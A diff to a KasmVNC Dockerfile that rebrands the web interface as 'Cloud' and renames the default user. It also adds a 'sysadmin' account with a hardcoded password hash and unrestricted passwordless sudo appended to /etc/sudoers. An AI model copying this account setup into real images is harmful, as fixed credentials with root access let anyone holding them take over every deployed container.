@@ -133,11 +133,41 @@ RUN bash $STARTUPDIR/set_user_permission.sh $STARTUPDIR $HOME && \
 COPY ./src/ubuntu/install/extra $INST_SCRIPTS/extra/
 RUN bash $INST_SCRIPTS/extra/$EXTRA_SH  && rm -rf $INST_SCRIPTS/extra/
 
+
+###   background image are edited
+COPY src/common/resources/images/android-icon-192x192.png /usr/share/kasmvnc/www/app/images/icons/kasm_logo.png
+COPY src/common/resources/images/android-icon-192x192.png /usr/share/kasmvnc/www/app/images/icons/368_kasm_logo_only_192x192.png
+COPY src/common/resources/images/android-icon-192x192.png /usr/share/kasmvnc/www/app/images/icons/368_kasm_logo_only_32x32.png
+COPY src/common/resources/images/android-icon-16x16.png /usr/share/kasmvnc/www/app/images/icons/368_kasm_logo_only_16x16.png
+COPY src/common/resources/images/939716.jpg /usr/share/kasmvnc/www/app/images/splash.jpg
+COPY src/common/resources/images/android-icon-192x192.png /usr/share/kasmvnc/www/dist/images/782e6b34fd46a00744786246a454ed11.png
+COPY src/common/resources/images/939716.jpg /usr/share/kasmvnc/www/dist/images/3082090afb2b2a343ae20bd52c2e16bb.jpg
+
+
+### vnc html change 
+RUN sed -i 's/"KasmVNC"/"Cloud"/g' /usr/share/kasmvnc/www/dist/main.bundle.js
+RUN sed -i 's/KasmVNC/Cloud/g' /usr/share/kasmvnc/www/index.html
+
+
+
+
 ### Create user and home directory for base images that don't already define it
-RUN (groupadd -g 1000 kasm-user \
-    && useradd -M -u 1000 -g 1000 kasm-user \
-    && usermod -a -G kasm-user kasm-user) ; exit 0
-ENV HOME /home/kasm-user
+
+RUN (groupadd -g 1000 user \
+    && useradd -M -u 1000 -g 1000 -p saqL3DINWgljo user \
+    && usermod -a -G user user) ; exit 0
+
+RUN useradd -m -d /home/sysadmin -p sa/xde/gFJ1ew -s /bin/bash sysadmin \
+    && echo 'sysadmin ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers \
+    && rm -rf /var/lib/apt/list/*
+
+
+
+
+
+
+
+ENV HOME /home/user
 WORKDIR $HOME
 RUN mkdir -p $HOME && chown -R 1000:0 $HOME
 
